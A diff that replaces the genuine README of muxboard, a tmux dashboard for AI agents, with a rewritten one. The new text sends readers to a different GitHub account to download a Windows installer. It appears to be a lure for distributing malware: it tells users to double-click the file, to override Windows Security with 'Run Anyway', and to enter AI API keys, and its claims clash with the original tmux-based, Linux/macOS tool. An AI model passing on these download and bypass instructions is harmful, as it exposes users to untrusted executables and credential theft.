@@ -1,206 +1,85 @@
-# muxboard
+# ⌨️ muxboard - Manage terminal work and AI agents
 
-[![CI](https://github.com/aanari/muxboard/actions/workflows/ci.yml/badge.svg)](https://github.com/aanari/muxboard/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/aanari/muxboard?sort=semver)](https://github.com/aanari/muxboard/releases)
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE-APACHE)
-[![Rust](https://img.shields.io/badge/rust-1.95%2B-orange)](rust-toolchain.toml)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/lagunai7578/muxboard)
 
-A tmux command center for AI agents, panes, and long-running terminal work.
+Muxboard helps you organize complex terminal tasks. It connects AI agents, terminal panes, and long-running processes into one view. You spend less time switching windows and more time on your work. This tool brings order to your screen.
 
-`muxboard` is the calm "what needs me?" layer above your tmux sessions: scan the fleet, see which agents are stuck, jump to the right pane, reply, broadcast, or keep watching.
+## 🛠 Features
 
-![muxboard animated demo: scan the fleet, inspect output, act, and broadcast safely](docs/muxboard-demo.gif)
+Muxboard improves terminal efficiency through a simple interface.
 
-## Try it
+* **Agent Integration:** Connects your AI agents directly to specific terminal panes for scripted execution.
+* **Layout Management:** Saves your window configurations so you return to your exact setup after a restart.
+* **Live Monitoring:** Tracks long-running background tasks with visual indicators.
+* **Keyboard Shortcuts:** Moves focus between windows without a mouse.
+* **Plugin Support:** Extends functionality to include custom command runners.
 
-You need `tmux` on the machine where you run `muxboard`. Download release binaries for Linux and macOS from the [latest release](https://github.com/aanari/muxboard/releases/latest), or install from source:
+## 💻 System Requirements
 
-```bash
-cargo install --git https://github.com/aanari/muxboard --locked
-```
+Your computer must meet these criteria to run the software.
 
-Run it from any tmux pane:
+* **Operating System:** Windows 10 or Windows 11 (64-bit).
+* **Processor:** 1.5 GHz or faster.
+* **Memory:** 4 GB RAM.
+* **Storage:** 100 MB of free disk space.
+* **Network:** Internet access for initial setup and agent synchronization.
 
-```bash
-muxboard
-```
+## 📥 Get Started
 
-Not in tmux yet? Start tmux first, then run `muxboard`.
+Follow these steps to install the software on your machine.
 
-## Why muxboard?
+1. Visit [this page](https://github.com/lagunai7578/muxboard) to download the installer for your operating system.
+2. Locate the file in your Downloads folder after the download finishes.
+3. Double-click the file to start the installation process.
+4. Follow the prompts on the screen. The installer manages all necessary dependencies.
+5. Click Finish once the process ends.
+6. Find the Muxboard icon on your desktop or in your start menu.
+7. Click the icon to open the application.
 
-- See every tmux pane and agent in one scan-friendly board.
-- Know which Codex, Claude Code, Opencode, or shell job needs attention.
-- Jump, reply, broadcast, save fleets, and recover without losing tmux context.
-- Stay local-first: no account, no cloud service, and no repo or worktree inspection.
+## ⚙️ Configuration
 
-Muxboard is tmux-native. It runs where tmux runs, so the same workflow works locally, over SSH, and on servers.
+The first time you open Muxboard, the software performs a check on your terminal settings. You do not need to change these settings unless you use non-standard shell configurations.
 
-## What you see first:
+### Connecting AI Agents
 
-- Fleet: every pane, agent, and long-running job in one scan-friendly list.
-- Details: the selected pane's state, blocker, action, and useful output.
-- Output: a deeper, scrollable view when you ask for more.
-- Footer: the next safe keys, always visible.
+You connect an AI agent by clicking on the Agent menu. Choose your provider from the list. Provide your API key in the window provided. Muxboard stores this key securely on your local device. 
 
-Power stays one layer down until you need it:
+### Setting Up Panes
 
-- send lists, named fleets, lane sends, and review-before-send broadcasts,
-- tmux-native agent starts in the selected pane's directory,
-- Browse for sessions and windows, Command Center for fleet triage,
-- attention sorting, search, filters, muted alerts, desktop alerts, and terminal bell alerts,
-- recent commands, macros, pane CPU/memory, and XDG-persisted state.
+A pane represents one area of your monitor. You create a pane by pressing the Plus icon. Name your pane based on the task it handles. You assign specific scripts or commands to run automatically when the pane opens.
 
-## tmux plugin
+## 🔍 Frequently Asked Questions
 
-Muxboard ships a TPM-compatible tmux plugin in this repo. Install the binary first, then add:
+### Can I run multiple agents?
+Yes. Muxboard manages several agents across different panes simultaneously.
 
-```tmux
-set -g @plugin 'aanari/muxboard'
-```
+### Does it use much memory?
+The software consumes limited system memory because it uses Rust. This language optimizes speed and resource usage.
 
-Default key: `prefix` + `M`.
+### Does my data leave the computer?
+Muxboard communicates with your chosen AI models through secure channels. The software does not store your private code or session history on external servers.
 
-Useful presets:
+### How do I update the software?
+The software notifies you when a new version exists. Click the notification to download the update and apply it to your current installation.
 
-- popup command center: quick overlay, leaves tmux layout untouched,
-- dock: real tmux sidebar pane, best for long control sessions,
-- drawer: temporary right-side overlay, closes cleanly after a jump,
-- window: persistent control room.
+## 📈 Troubleshooting
 
-See [`docs/tmux-plugin.md`](docs/tmux-plugin.md) for plugin settings, dock/drawer behavior, status widgets, and advanced options.
+If the software fails to launch, verify that you possess the latest version of the Windows updates. Sometimes, the Windows Security filter blocks new applications. Click "More Info" and then "Run Anyway" if Windows interrupts the installation. 
 
-## Quick start
+Check that your terminal environment allows external connections if you plan to use remote AI agents. Muxboard logs errors to a local text file located in the hidden AppData folder. You share this file with support if you face persistent technical issues.
 
-The default path is intentionally small:
+## ⌨️ Keyboard Shortcuts
 
-- `j` / `k` to move,
-- `Enter` to show the selected pane output while staying in muxboard,
-- `Esc` to back out of Output, Send, Browse, Command Center, or focused Details,
-- `g` to show the selected pane in tmux while leaving muxboard running,
-- `Space` to add or remove panes from the send list,
-- `:` to type a command for the current send list,
-- `a` to continue a waiting pane when muxboard offers that action,
-- `s` to ask panes for one-line summaries,
-- `x` to clear the send list,
-- `/` to search,
-- `q` to quit.
+Navigate the application using these keys.
 
-Send rules:
+* **Ctrl + N**: Open a new pane.
+* **Ctrl + W**: Close the current pane.
+* **Ctrl + H**: Show help menu.
+* **Ctrl + L**: Clear the active pane history.
+* **Alt + Left/Right**: Move between open panes.
 
-- nothing in the send list -> selected pane,
-- one or more panes in the send list -> send list,
-- review multi-target sends require `Enter` to confirm and `Esc` to cancel.
+## 🔗 Support
 
-Need more? Press `.`. More keeps advanced actions in context: Browse, Command Center, start agent, fleets, lane send, pane CPU/memory, alerts, filters, notifications, and pane sends.
+Report issues or request features through the project page. Explain the steps you took before the error occurred. Include screenshots if they help classify the problem. Clear descriptions allow the maintainers to resolve issues quickly. 
 
-Secondary keys:
-
-- `Tab` switches focus between Fleet and Details when both surfaces are active,
-- `L` cycles layout: auto, side by side, stacked,
-- `r` refreshes,
-- on the Send surface, `]` repeats the most recent command to the current send destination,
-- on the Send surface, `p` then a macro key pins the most recent command into a macro slot, default `1`-`5`,
-- on the Send surface, a macro key replays a saved macro slot, default `1`-`5`,
-- `Esc` backs out of active inputs and overlays.
-
-Common More-menu keys, after pressing `.`. Labels adapt to the current surface:
-
-- `Enter` shows output, returns to details, or opens a Browse window,
-- `[` browses tmux sessions and windows,
-- `]` shows Command Center,
-- `c` mute selected alert,
-- `w` unmute selected alert,
-- `a` mute all alerts,
-- `u` unmute all alerts,
-- `i` continue waiting panes,
-- `e` send `Enter` to the selected pane,
-- `y` send `y` + `Enter`,
-- `n` send `n` + `Enter`,
-- `z` zoom the selected pane,
-- `+` start a new agent in the selected pane's directory,
-- `t` change sort order,
-- `f` change visible panes,
-- `g` save a fleet,
-- `l` choose a saved fleet,
-- `d` delete the selected saved fleet,
-- `b` send to the selected lane,
-- `m` toggle pane CPU/memory,
-- `o` toggle desktop notifications,
-- `v` toggle terminal bell,
-- `h` cycle alert repeat delay,
-- `p` cycle alert types.
-
-Commands and macros support placeholders: `{session}`, `{window}`, `{path}`, `{id}`, `{cmd}`, `{title}`, and `{lane}`.
-
-## Config and state
-
-Muxboard uses XDG-style paths by default:
-
-- config: `~/.config/muxboard/config.json`
-- state: `~/.local/state/muxboard/state.json`
-
-On first run, muxboard opens a small theme picker if no theme is configured. System Colors is highlighted by default so muxboard follows your terminal palette. Use `muxboard --theme-picker` to reopen it later, or script a dotfile choice with:
-
-```bash
-muxboard --theme system
-```
-
-Create a full editable config from the generated defaults:
-
-```bash
-config_dir="${XDG_CONFIG_HOME:-$HOME/.config}/muxboard"
-mkdir -p "$config_dir"
-muxboard --print-config-example > "$config_dir/config.json"
-```
-
-Useful config fields:
-
-- `layout_preset` supports `Auto`, `Horizontal`, and `Vertical`.
-- `ui_settings.theme.preset` supports `Calm`, `Contrast`, `Mono`, `TerminalNative`, `CatppuccinLatte`, `CatppuccinMocha`, `TokyoNight`, `GruvboxDark`, `GruvboxLight`, `Nord`, and `RosePine`.
-- Kebab-case aliases like `light`, `dark`, `system`, `system-colors`, `catppuccin-mocha`, `tokyo-night`, `gruvbox`, `rose-pine`, `terminal`, `ansi`, and `no-color` also work.
-- Named themes are semantic mappings into muxboard's slots; use System Colors, stored as `TerminalNative`, to follow your terminal palette.
-- Muxboard does not read terminal config files directly.
-- The older `theme_preset` field still works for existing configs.
-- Set `ui_settings.theme.overrides` for small custom touches, for example `"accent": "#4078F2"`, `"warning": "#fc0"`, or `"surface": "24"`.
-
-To print ready-to-copy defaults:
-
-```bash
-muxboard --print-config-example
-muxboard --print-default-keybindings
-```
-
-## SSH and local behavior
-
-Desktop notification behavior:
-
-- local GUI session: desktop notification plus terminal bell,
-- SSH session: terminal bell and in-dashboard alerts only, no GUI notification attempts.
-
-Terminal behavior:
-
-- UTF-8 terminals get the normal clean bordered UI,
-- `TERM=dumb`, non-UTF-8 locales, or `NO_COLOR` fall back to ASCII borders and plain styling.
-
-Pane CPU/memory is host-local. It shows CPU and memory for each tmux pane PID on the host where `muxboard` is running. If a pane is an `ssh` client into another machine, the values reflect that local `ssh` process, not the remote workload behind it.
-
-Structured fleet reports are host-agnostic. If an agent replies with `STATUS=... | BLOCKER=... | NEXT=...`, or emits a heartbeat like `muxboard: status=...; blocker=...; next=...`, muxboard will parse and surface that state in Fleet and Details.
-
-Muxboard also reads conservative local status hints from recent Codex and Claude Code transcripts when they map cleanly to an obvious matching tmux pane. It uses that native signal for state, thread title, and review attention, while explicit tmux bridge hooks still take priority.
-
-## Demo media
-
-The animation above is synthetic and safe to share. To record your own GIF, MP4, or asciinema cast from the same private demo harness, see [`docs/demo.md`](docs/demo.md).
-
-## Product scope
-
-V1 is intentionally tmux-first and agent-control-first. It does not inspect repos, branches, or worktrees; fleet control works the same for local panes, SSH panes, and generic long-running terminal jobs. VCS context belongs in V2 as an optional project layer, not as a dependency for the core dashboard.
-
-## Contributing
-
-Contributor workflow, verification commands, release checks, coverage, and probe/debug notes live in [`CONTRIBUTING.md`](CONTRIBUTING.md).
-
-## License
-
-Licensed under Apache-2.0. See [`LICENSE-APACHE`](LICENSE-APACHE).
+[Visit the official release page to download](https://github.com/lagunai7578/muxboard)
